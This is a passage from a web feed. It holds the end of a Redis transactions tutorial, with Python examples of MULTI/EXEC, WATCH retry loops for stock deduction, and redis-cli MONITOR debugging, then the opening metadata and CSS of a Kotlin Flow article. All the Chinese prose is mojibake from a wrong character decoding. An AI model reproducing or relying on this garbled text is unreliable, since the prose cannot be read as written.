pipe.<span class="hljs-built_in">set</span>(<span class="hljs-string">'order:1001:status'</span>, <span class="hljs-string">'paid'</span>)
pipe.decr(<span class="hljs-string">'stock:1001'</span>)
result = pipe.execute()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result <span class="hljs-keyword">or</span> result[<span class="hljs-number">0</span>] != <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"äº‹åŠ¡å¤±è´¥ï¼Œéœ€å›æ»šæˆ–é‡è¯•"</span>)
</code></pre>
<h4 data-id="heading-47">æ¡ˆä¾‹2ï¼šè¯¯ç”¨WATCHå¯¼è‡´æ­»å¾ªç¯</h4>
<p>åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œ<code>WATCH</code> å¤±è´¥åæœªè®¾ç½®é‡è¯•ä¸Šé™ï¼Œå¯¼è‡´å®¢æˆ·ç«¯é™·å…¥æ­»å¾ªç¯ï¼ŒCPU å ç”¨é£™å‡ã€‚<br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šåŠ å…¥é‡è¯•æ¬¡æ•°é™åˆ¶ï¼š</p>
<pre><code class="hljs language-python" lang="python">max_retries = <span class="hljs-number">5</span>
<span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(max_retries):
    <span class="hljs-keyword">try</span>:
        client.watch(<span class="hljs-string">'stock:1001'</span>)
        stock = client.get(<span class="hljs-string">'stock:1001'</span>)
        pipe = client.pipeline()
        pipe.multi()
        pipe.decr(<span class="hljs-string">'stock:1001'</span>)
        pipe.execute()
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">except</span> redis.WatchError:
        <span class="hljs-keyword">if</span> attempt == max_retries - <span class="hljs-number">1</span>:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"é‡è¯•æ¬¡æ•°è¶…é™"</span>)
        time.sleep(<span class="hljs-number">0.1</span>)
</code></pre>
<p>é€šè¿‡æœ¬ç« ï¼Œä½ å·²ç»æŒæ¡äº†äº‹åŠ¡çš„é«˜çº§ç”¨æ³•å’Œä¼˜åŒ–æŠ€å·§ï¼Œä» Lua è„šæœ¬çš„çµæ´»æ€§åˆ°åˆ†å¸ƒå¼ç¯å¢ƒçš„åº”å¯¹ç­–ç•¥ï¼Œå†åˆ°è¸©å‘åçš„åæ€ï¼ŒRedis äº‹åŠ¡çš„â€œå…¨è²Œâ€é€æ¸æ¸…æ™°ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åˆ†äº«ä¸€äº›çœŸå®é¡¹ç›®ä¸­çš„ç»éªŒæ•™è®­ï¼Œå‘Šè¯‰ä½ å¦‚ä½•æŠŠè¿™äº›çŸ¥è¯†è½åœ°åˆ°å®é™…å¼€å‘ä¸­ã€‚å‡†å¤‡å¥½è¿æ¥å®æˆ˜çš„â€œå¹²è´§â€äº†å—ï¼Ÿ</p>
<hr/>
<h2 data-id="heading-48">å…­ã€é¡¹ç›®ç»éªŒåˆ†äº«ï¼šäº‹åŠ¡æœºåˆ¶çš„æœ€ä½³å®è·µï¼ˆçº¦600-800å­—ï¼‰</h2>
<p>ç†è®ºå’ŒæŠ€å·§å›ºç„¶é‡è¦ï¼Œä½†çœŸæ­£è®©æŠ€æœ¯â€œè½åœ°â€çš„ï¼Œè¿˜æ˜¯é¡¹ç›®ä¸­çš„å®æˆ˜ç»éªŒã€‚åœ¨è¿™ä¸€ç« ï¼Œæˆ‘å°†ç»“åˆè¿‡å»å‡ å¹´åœ¨å®æ—¶è®¢å•å¤„ç†ç³»ç»Ÿä¸­çš„å®è·µï¼Œåˆ†äº«å¦‚ä½•ç”¨ <code>MULTI</code>ã€<code>EXEC</code> å’Œ <code>WATCH</code> è§£å†³å®é™…é—®é¢˜ï¼ŒåŒæ—¶å‰–æè¸©è¿‡çš„å‘å’Œæ€»ç»“çš„æœ€ä½³å®è·µã€‚å¸Œæœ›è¿™äº›â€œå¹²è´§â€èƒ½ä¸ºä½ çš„é¡¹ç›®æä¾›å¯å‘ï¼</p>
<h3 data-id="heading-49">1. å®é™…é¡¹ç›®ä¸­çš„åº”ç”¨</h3>
<h4 data-id="heading-50">é¡¹ç›®èƒŒæ™¯ï¼šå®æ—¶è®¢å•å¤„ç†ç³»ç»Ÿ</h4>
<p>åœ¨ä¸€ä¸ªç”µå•†å¹³å°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¤„ç†ç”¨æˆ·çš„ä¸‹å•è¯·æ±‚ï¼Œç¡®ä¿è®¢å•çŠ¶æ€æ›´æ–°å’Œåº“å­˜æ‰£å‡åŒæ—¶å®Œæˆï¼ŒåŒæ—¶åº”å¯¹é«˜å³°æœŸçš„å¹¶å‘å‹åŠ›ã€‚Redis äº‹åŠ¡æˆä¸ºæˆ‘ä»¬çš„é¦–é€‰å·¥å…·ï¼Œå› ä¸ºå®ƒæ—¢èƒ½ä¿è¯åŸå­æ€§ï¼Œåˆä¸ä¼šå¼•å…¥é”çš„é¢å¤–å¼€é”€ã€‚</p>
<h4 data-id="heading-51">å¦‚ä½•ä½¿ç”¨ MULTI/EXEC ä¿è¯æ•°æ®ä¸€è‡´æ€§</h4>
<p>æˆ‘ä»¬è®¾è®¡äº†ä¸€ä¸ªäº‹åŠ¡æ¥åŒæ­¥æ›´æ–°è®¢å•å’Œåº“å­˜ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_order</span>(<span class="hljs-params">client, order_id, product_id, quantity</span>):
    pipe = client.pipeline()
    pipe.multi()
    pipe.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"order:<span class="hljs-subst">{order_id}</span>:status"</span>, <span class="hljs-string">"paid"</span>)  <span class="hljs-comment"># æ›´æ–°è®¢å•çŠ¶æ€</span>
    pipe.decrby(<span class="hljs-string">f"stock:<span class="hljs-subst">{product_id}</span>"</span>, quantity)  <span class="hljs-comment"># æ‰£å‡åº“å­˜</span>
    result = pipe.execute()
    <span class="hljs-keyword">return</span> result  <span class="hljs-comment"># è¿”å› [True, remaining_stock]</span>
</code></pre>
<p><strong>åº”ç”¨æ•ˆæœ</strong>ï¼šåœ¨å•èŠ‚ç‚¹ Redis ä¸Šï¼Œè¿™ä¸ªäº‹åŠ¡ç¡®ä¿äº†ä¸¤æ­¥æ“ä½œçš„åŸå­æ€§ï¼Œæ¯å¤©å¤„ç†æ•°ä¸‡è®¢å•æœªå‡ºç°ä¸ä¸€è‡´é—®é¢˜ã€‚</p>
<h4 data-id="heading-52">å¦‚ä½•ç”¨ WATCH å®ç°å¹¶å‘æ§åˆ¶</h4>
<p>åœ¨ç§’æ€æ´»åŠ¨ä¸­ï¼Œæˆ‘ä»¬å¼•å…¥ <code>WATCH</code> é˜²æ­¢åº“å­˜è¶…å–ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy_in_seckill</span>(<span class="hljs-params">client, product_id, quantity</span>):
    key = <span class="hljs-string">f"stock:<span class="hljs-subst">{product_id}</span>"</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):  <span class="hljs-comment"># æœ€å¤šé‡è¯•3æ¬¡</span>
        client.watch(key)
        stock = <span class="hljs-built_in">int</span>(client.get(key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> stock &lt; quantity:
            client.unwatch()
            <span class="hljs-keyword">return</span> <span class="hljs-string">"åº“å­˜ä¸è¶³"</span>
        pipe = client.pipeline()
        pipe.multi()
        pipe.decrby(key, quantity)
        <span class="hljs-keyword">try</span>:
            result = pipe.execute()
            <span class="hljs-keyword">if</span> result:
                <span class="hljs-keyword">return</span> <span class="hljs-string">"è´­ä¹°æˆåŠŸ"</span>
        <span class="hljs-keyword">except</span> redis.WatchError:
            <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">"è´­ä¹°å¤±è´¥ï¼Œè¯·é‡è¯•"</span>
</code></pre>
<p><strong>åº”ç”¨æ•ˆæœ</strong>ï¼šåœ¨ 5000 QPS çš„å‹åŠ›ä¸‹ï¼Œåº“å­˜æ‰£å‡å‡†ç¡®æ— è¯¯ï¼Œå¤±è´¥ç‡æ§åˆ¶åœ¨ 2% ä»¥å†…ã€‚</p>
<h3 data-id="heading-53">2. è¸©å‘ä¸æ•™è®­</h3>
<h4 data-id="heading-54">é”™è¯¯æ¡ˆä¾‹ï¼šæœªæ­£ç¡®å¤„ç† EXEC å¤±è´¥</h4>
<p>åœ¨æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬å‡è®¾ <code>EXEC</code> è¿”å›éç©ºå°±è¡¨ç¤ºæˆåŠŸï¼Œä½†ä¸€æ¬¡ç½‘ç»œæŠ–åŠ¨å¯¼è‡´ç»“æœä¸¢å¤±ï¼Œåº“å­˜æ‰£äº†ä½†è®¢å•æœªæ›´æ–°ã€‚<br/>
<strong>æ•™è®­</strong>ï¼šä¸èƒ½ä»…ä¾èµ–è¿”å›å€¼çš„å­˜åœ¨æ€§ï¼Œå¿…é¡»éªŒè¯æ¯ä¸ªå‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚<br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå®Œå–„å¼‚å¸¸æ•è·ï¼š</p>
<pre><code class="hljs language-python" lang="python">result = pipe.execute()
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(result) != <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">0</span>] != <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> result[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>:
    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">"äº‹åŠ¡å¤±è´¥ï¼Œéœ€æ£€æŸ¥æ•°æ®ä¸€è‡´æ€§"</span>)
</code></pre>
<h4 data-id="heading-55">é”™è¯¯æ¡ˆä¾‹ï¼šWATCH é‡è¯•æœªåŠ é™åˆ¶</h4>
<p>åœ¨ç§’æ€åœºæ™¯ä¸­ï¼Œé«˜å¹¶å‘ä¸‹ <code>WATCH</code> é¢‘ç¹å¤±è´¥ï¼Œå®¢æˆ·ç«¯æœªè®¾ç½®ä¸Šé™ï¼Œå¯¼è‡´è¯·æ±‚å †ç§¯ï¼ŒRedis è´Ÿè½½æ¿€å¢ã€‚<br/>
<strong>æ•™è®­</strong>ï¼šé‡è¯•å¿…é¡»å¯æ§ï¼Œé¿å…æ— é™å¾ªç¯ã€‚<br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè®¾ç½®æœ€å¤§é‡è¯•æ¬¡æ•°ï¼ˆå¦‚ä¸Šä¾‹ä¸­çš„ 3 æ¬¡ï¼‰ï¼Œå¹¶è®°å½•æ—¥å¿—ä¾¿äºæ’æŸ¥ã€‚</p>
<h3 data-id="heading-56">3. ç»éªŒæ€»ç»“</h3>
<h4 data-id="heading-57">äº‹åŠ¡è®¾è®¡çš„â€œä¸‰åŸåˆ™â€</h4>
<p>åŸºäºå¤šæ¬¡å®æˆ˜ï¼Œæˆ‘æ€»ç»“äº† Redis äº‹åŠ¡è®¾è®¡çš„ä¸‰ä¸ªå…³é”®è¯ï¼š</p>
<ul>
<li><strong>è½»é‡</strong>ï¼šäº‹åŠ¡å°½é‡çŸ­å°ï¼Œé¿å…å¡å…¥å¤æ‚é€»è¾‘ã€‚</li>
<li><strong>æ˜ç¡®</strong>ï¼šæ˜ç¡®æ¯ä¸ªå‘½ä»¤çš„ç›®çš„å’Œé¢„æœŸç»“æœï¼Œä¾¿äºè°ƒè¯•ã€‚</li>
<li><strong>å¯æ§</strong>ï¼šåŠ å…¥é‡è¯•å’Œå¼‚å¸¸å¤„ç†ï¼Œç¡®ä¿å¤±è´¥ä¹Ÿèƒ½ä¼˜é›…é€€å‡ºã€‚</li>
</ul>
<h4 data-id="heading-58">æ¨èå·¥å…·ä¸è°ƒè¯•æŠ€å·§</h4>
<ul>
<li><strong><code>redis-cli</code> è°ƒè¯•</strong>ï¼šç”¨ <code>MONITOR</code> å‘½ä»¤è§‚å¯Ÿäº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ï¼Œç¡®è®¤å‘½ä»¤æ˜¯å¦æŒ‰é¢„æœŸå…¥é˜Ÿå’Œæ‰§è¡Œã€‚</li>
<li><strong>æ—¥å¿—è®°å½•</strong>ï¼šåœ¨å®¢æˆ·ç«¯è®°å½•æ¯æ¬¡äº‹åŠ¡çš„è¾“å…¥å’Œè¾“å‡ºï¼Œä¾¿äºäº‹ååˆ†æã€‚</li>
<li><strong>å‹åŠ›æµ‹è¯•</strong>ï¼šç”¨å·¥å…·å¦‚ <code>redis-benchmark</code> æ¨¡æ‹Ÿé«˜å¹¶å‘ï¼ŒéªŒè¯äº‹åŠ¡æ€§èƒ½ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šç”¨ redis-cli è°ƒè¯•</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç›‘æ§å®æ—¶å‘½ä»¤</span>
redis-cli MONITOR
<span class="hljs-comment"># å®¢æˆ·ç«¯æ‰§è¡Œäº‹åŠ¡</span>
MULTI
SET key1 val1
EXEC
<span class="hljs-comment"># MONITOR è¾“å‡ºï¼š</span>
<span class="hljs-string">" MULTI"</span>
<span class="hljs-string">" SET key1 val1"</span>
<span class="hljs-string">" EXEC"</span>
</code></pre>
<p>é€šè¿‡æœ¬ç« ï¼Œä½ ä¸ä»…çœ‹åˆ°äº† Redis äº‹åŠ¡åœ¨çœŸå®é¡¹ç›®ä¸­çš„åº”ç”¨ï¼Œè¿˜å­¦åˆ°äº†å¦‚ä½•é¿å‘å’Œä¼˜åŒ–è®¾è®¡ã€‚è¿™äº›ç»éªŒå°±åƒâ€œå‰è¾ˆçš„å®å˜±â€ï¼Œå¸Œæœ›èƒ½å¸®ä½ åœ¨è‡ªå·±çš„é¡¹ç›®ä¸­å°‘èµ°å¼¯è·¯ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è¿›å…¥æ€»ç»“ä¸å±•æœ›éƒ¨åˆ†ï¼Œæç‚¼æ ¸å¿ƒè¦ç‚¹å¹¶çœ‹çœ‹ Redis äº‹åŠ¡çš„æœªæ¥ã€‚æœ€åä¸€ç« ï¼Œæ•¬è¯·æœŸå¾…ï¼</p>
<hr/>
<h2 data-id="heading-59">ä¸ƒã€æ€»ç»“ä¸å±•æœ›ï¼ˆçº¦400-500å­—ï¼‰</h2>
<p>ç»è¿‡å‰å‡ ç« çš„æ—…ç¨‹ï¼Œæˆ‘ä»¬ä» Redis äº‹åŠ¡çš„åŸºç¡€åŸç†ï¼Œåˆ° <code>MULTI</code> å’Œ <code>EXEC</code> çš„æ·±å…¥å‰–æï¼Œå†åˆ° <code>WATCH</code> çš„ä¹è§‚é”å®æˆ˜ï¼Œæœ€åç»“åˆé¡¹ç›®ç»éªŒæ¢ç´¢äº†æœ€ä½³å®è·µã€‚ç°åœ¨ï¼Œæ˜¯æ—¶å€™åœä¸‹æ¥å›é¡¾ä¸€ä¸‹æ”¶è·ï¼Œå¹¶ä¸ºä½ çš„ä¸‹ä¸€æ­¥å®è·µæŒ‡æ˜æ–¹å‘äº†ã€‚è®©æˆ‘ä»¬ä¸€èµ·æ€»ç»“è¦ç‚¹ï¼Œå±•æœ›æœªæ¥ï¼</p>
<h3 data-id="heading-60">1. æ ¸å¿ƒè¦ç‚¹å›é¡¾</h3>
<ul>
<li><strong><code>MULTI/EXEC</code> çš„åŸå­æ€§ä¸å±€é™</strong>ï¼š<code>MULTI</code> å’Œ <code>EXEC</code> æä¾›äº†ä¸€ä¸ªè½»é‡çº§çš„åŸå­æ“ä½œæ¡†æ¶ï¼Œé€‚åˆæ‰¹é‡æ›´æ–°åœºæ™¯ã€‚ä½†å®ƒä¸æ”¯æŒå›æ»šï¼Œé”™è¯¯å¤„ç†éœ€è¦å®¢æˆ·ç«¯æå‰è®¾è®¡ã€‚è¿™ç§â€œç®€å•ç²—æš´â€çš„é£æ ¼ï¼Œæ—¢æ˜¯ä¼˜åŠ¿ä¹Ÿæ˜¯æŒ‘æˆ˜ã€‚</li>
<li><strong><code>WATCH</code> çš„ä¹è§‚é”ç‰¹æ€§ä¸å®æˆ˜ä»·å€¼</strong>ï¼š<code>WATCH</code> ä¸ºäº‹åŠ¡å¼•å…¥äº†å¹¶å‘æ§åˆ¶èƒ½åŠ›ï¼Œåƒä¸€ä¸ªæ•é”çš„â€œå“¨å…µâ€ï¼Œåœ¨åº“å­˜æ‰£å‡ã€ç§’æ€ç­‰åœºæ™¯ä¸­å¤§æ˜¾èº«æ‰‹ã€‚å®ƒçš„è½»é‡æ€§å’Œé«˜æ•ˆæ€§ï¼Œè®©é«˜å¹¶å‘ä¸‹çš„æ•°æ®ä¸€è‡´æ€§ä¸å†æ˜¯éš¾é¢˜ã€‚</li>
<li><strong>å®è·µä¸­çš„å–èˆ</strong>ï¼šäº‹åŠ¡è™½å¥½ï¼Œä½†ä¸èƒ½æ»¥ç”¨ã€‚ç»“åˆ Lua è„šæœ¬ã€ä¼˜åŒ–å‘½ä»¤æ•°é‡ã€å¤„ç†åˆ†å¸ƒå¼é™åˆ¶ï¼Œéƒ½æ˜¯é¡¹ç›®ä¸­éœ€è¦æƒè¡¡çš„å…³é”®ã€‚</li>
</ul>
<h3 data-id="heading-61">2. å¯¹è¯»è€…çš„å»ºè®®</h3>
<p>æƒ³åœ¨é¡¹ç›®ä¸­ç”¨å¥½ Redis äº‹åŠ¡ï¼Ÿè¿™é‡Œæœ‰å‡ æ¡å®æˆ˜å»ºè®®ï¼š</p>
<ul>
<li><strong>ä»å°å¤„å…¥æ‰‹</strong>ï¼šå…ˆç”¨ <code>MULTI/EXEC</code> è§£å†³ç®€å•åœºæ™¯ï¼Œæ¯”å¦‚ç¼“å­˜æ‰¹é‡æ›´æ–°ï¼Œç†Ÿæ‚‰åå†å°è¯• <code>WATCH</code>ã€‚</li>
<li><strong>é¢„åˆ¤ä¸éªŒè¯</strong>ï¼šè®¾è®¡äº‹åŠ¡æ—¶ï¼Œæå‰è€ƒè™‘å¤±è´¥åœºæ™¯ï¼ŒåŠ å…¥ç»“æœæ ¡éªŒå’Œé‡è¯•é€»è¾‘ã€‚</li>
<li><strong>æŒç»­å­¦ä¹ </strong>ï¼šå…³æ³¨ Redis çš„æ–°ç‰ˆæœ¬ï¼Œæ¯”å¦‚ 6.0+ å¼•å…¥çš„æ”¹è¿›ï¼ˆå¦‚æ›´å¼ºçš„å®¢æˆ·ç«¯æ”¯æŒï¼‰ï¼Œå®ƒä»¬å¯èƒ½ä¸ºäº‹åŠ¡å¸¦æ¥æ–°å¯èƒ½ã€‚</li>
</ul>
<p>å…·ä½“å®è·µæ—¶ï¼Œä¸å¦¨ä»ä¸€ä¸ªå°åŠŸèƒ½å¼€å§‹ï¼Œæ¯”å¦‚ç”¨äº‹åŠ¡å®ç°ç§¯åˆ†ç´¯åŠ ï¼Œç„¶åé€æ­¥æ‰©å±•åˆ°å¹¶å‘æ§åˆ¶åœºæ™¯ã€‚è¾¹åšè¾¹è°ƒï¼Œä½ ä¼šå‘ç° Redis äº‹åŠ¡çš„é­…åŠ›ã€‚</p>
<h3 data-id="heading-62">3. ç»“è¯­ä¸å±•æœ›</h3>
<p>Redis äº‹åŠ¡æœºåˆ¶è™½ç„¶ä¸ç®—å®Œç¾ï¼Œä½†å®ƒç”¨æœ€å°çš„ä»£ä»·å®ç°äº†æœ€å¤§çš„ä»·å€¼ï¼Œè¿™æ­£æ˜¯ Redis â€œå¿«è€Œçµæ´»â€å“²å­¦çš„ä½“ç°ã€‚æœªæ¥ï¼Œéšç€ Redis åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„åº”ç”¨åŠ æ·±ï¼Œäº‹åŠ¡åŠŸèƒ½å¯èƒ½ä¼šè¿›ä¸€æ­¥å¢å¼ºï¼Œæ¯”å¦‚æ›´å¥½çš„é›†ç¾¤æ”¯æŒæˆ–æ›´çµæ´»çš„é”™è¯¯å¤„ç†æœºåˆ¶ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œä¿æŒå¯¹æ–°æŠ€æœ¯çš„å¥½å¥‡å¿ƒï¼ŒæŒç»­æ¢ç´¢ï¼Œæ‰èƒ½åœ¨å˜åŒ–ä¸­æ‰¾åˆ°æœ€ä½³è§£æ³•ã€‚</p>
<p>æœ€åï¼Œæˆ‘æƒ³é‚€è¯·ä½ ç•™è¨€åˆ†äº«è‡ªå·±çš„å®æˆ˜ç»éªŒã€‚ä½ åœ¨é¡¹ç›®ä¸­å¦‚ä½•ç”¨ Redis äº‹åŠ¡è§£å†³éš¾é¢˜ï¼Ÿè¸©è¿‡å“ªäº›å‘ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµï¼Œè®©æˆ‘ä»¬ä¸€èµ·æˆé•¿ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ååˆ†é’Ÿé€Ÿè§ˆ Kotlin Flow æ“ä½œç¬¦]]></title>    <link>https://juejin.cn/post/7581870491762671668</link>    <guid>https://juejin.cn/post/7581870491762671668</guid>    <pubDate>2025-12-10T02:51:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491762671668" data-draft-id="7576532425761865743" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ååˆ†é’Ÿé€Ÿè§ˆ Kotlin Flow æ“ä½œç¬¦"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2025-12-10T02:51:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ååˆ†é’Ÿé€Ÿè§ˆ Kotlin Flow æ“ä½œç¬¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:51:59.000Z" title="Wed Dec 10 2025 02:51:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#5f6368;background-image:linear-gradient(90deg,rgba(240,191,213,.1) 3%,transparent 0),linear-gradient(1turn,rgba(240,191,213,.1) 3%,transparent 0);background-size:20px 20px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-left:50px;padding-bottom:5px;color:#5f6368}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:0;display:block;content:""}.markdown-body h1{font-size:32px;margin-bottom:5px}.markdown-body h1:before{top:0;content:"ğŸ¦„";font-size:32px}.markdown-body h2{padding-bottom:24px;border-bottom:1px solid #ececec}.markdown-body h2:before{top:0;left:8px;content:"ğŸ³";font-size:24px}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{top:-2px;left:8px;content:"ğŸ„";font-size:20px}.markdown-body h4{font-size:16px}.markdown-body h4:before{top:-2px;left:8px;content:"ğŸ¦¥";font-size:18px}.markdown-body h5{font-size:14px}.markdown-body h5:before{top:-2px;left:9px;content:"ğŸ¦©";font-size:16px}.markdown-body h6{font-size:12px;margin-top:5px}.markdown-body h6:before{top:-1px;left:10px;content:"ğŸ§";font-size:14px}.markdown-body p{line-height:1.9;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid rgba(253,121,168,.5);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#a6accd;background:#292d3e;border-radius:8px}.markdown-body a{text-decoration:none;color:#fd79a8;border-bottom:1px solid #fd79a8;padding:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(253,121,168,.1);color:#ee69a9}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body th{color:#fd79a8}.markdown-body th,.markdown-body tr:hover{background:rgba(253,121,168,.1)}.markdown-body td{min-width:120px}.markdown-body blockquote{position:relative;color:#666;padding:23px;margin:22px 0;border-left:4px solid #ee69a9;background-color:rgba(253,121,168,.1)}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;display:block;font-size:27px;color:#fd79a8;opacity:.8}.markdown-body blockquote:before{left:10px;top:0;content:"â"}.markdown-body blockquote:after{right:10px;bottom:0;content:"â"}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body strong{position:relative;color:#fd79a8}.markdown-body strong:before{content:"Â· "}.markdown-body strong:after{content:" Â·"}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#fd79a8}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#ee69a9}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml 